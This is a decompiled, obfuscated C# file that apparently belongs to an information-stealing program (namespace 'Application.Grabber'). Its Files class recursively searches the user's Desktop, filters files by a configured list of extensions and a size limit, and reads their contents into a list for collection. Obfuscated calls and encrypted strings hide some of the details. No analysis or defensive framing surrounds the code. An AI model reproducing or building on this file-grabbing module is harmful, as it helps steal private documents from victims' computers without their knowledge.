using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;

namespace Application.Grabber.Other
{
	// Token: 0x0200000D RID: 13
	internal class Files
	{
		// Token: 0x1700001A RID: 26
		// (get) Token: 0x06000056 RID: 86 RVA: 0x00003534 File Offset: 0x00001734
		// (set) Token: 0x06000057 RID: 87 RVA: 0x00003548 File Offset: 0x00001748
		public static int Count { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x06000058 RID: 88 RVA: 0x0000355C File Offset: 0x0000175C
		[MethodImpl(MethodImplOptions.NoInlining)]
		public static List<FileObject> Execute()
		{
			List<FileObject> list = new List<FileObject>();
			foreach (string text in delegate0e2.f0000e2(Paths.DesktopPath, c0000c0.m00000f("»"), SearchOption.AllDirectories))
			{
				if (Files.Count >= Settings.MaxCountFiles)
				{
					break;
				}
				Files.c00000e c00000e = new Files.c00000e();
				c00000e.type = text.Split(new char[]
				{
					'.'
				}).Last<string>().ToLower();
				if (Settings.FileTypes.Where(new Func<string, bool>(c00000e.m000009)).Count<string>() > 0)
				{
					FileInfo p = new FileInfo(text);
					if (delegate0e3.f0000e4(p) > 0L && delegate0e3.f0000e4(p) < (long)Settings.MaxFileSize)
					{
						list.Add(new FileObject(delegate0d0.f0000ba(c0000c0.m00000f("×h!\u0001Õ5"), delegate0cd.f0000a4(p)), delegate0e4.f0000ea(delegate0cd.f0000a5(p))));
						Files.Count++;
					}
				}
			}
			return list;
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00003688 File Offset: 0x00001888
		[MethodImpl(MethodImplOptions.NoInlining)]
		public Files()
		{
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00003690 File Offset: 0x00001890
		// Note: this type is marked as 'beforefieldinit'.
		[MethodImpl(MethodImplOptions.NoInlining)]
		static Files()
		{
			c0000c0.Initialize();
			c0000c0.PostInitialize();
		}

		// Token: 0x0400001F RID: 31
		[CompilerGenerated]
		private static int f00001a;

		// Token: 0x0200000E RID: 14
		[CompilerGenerated]
		private sealed class c00000e
		{
			// Token: 0x0600005B RID: 91 RVA: 0x0000369C File Offset: 0x0000189C
			[MethodImpl(MethodImplOptions.NoInlining)]
			public c00000e()
			{
			}

			// Token: 0x0600005C RID: 92 RVA: 0x000036A4 File Offset: 0x000018A4
			[MethodImpl(MethodImplOptions.NoInlining)]
			internal bool m000009(string item)
			{
				return delegate0db.f0000d8(item, this.type);
			}

			// Token: 0x0600005D RID: 93 RVA: 0x000036C4 File Offset: 0x000018C4
			// Note: this type is marked as 'beforefieldinit'.
			[MethodImpl(MethodImplOptions.NoInlining)]
			static c00000e()
			{
				c0000c0.Initialize();
				c0000c0.PostInitialize();
			}

			// Token: 0x04000020 RID: 32
			public string type;
		}
	}
}
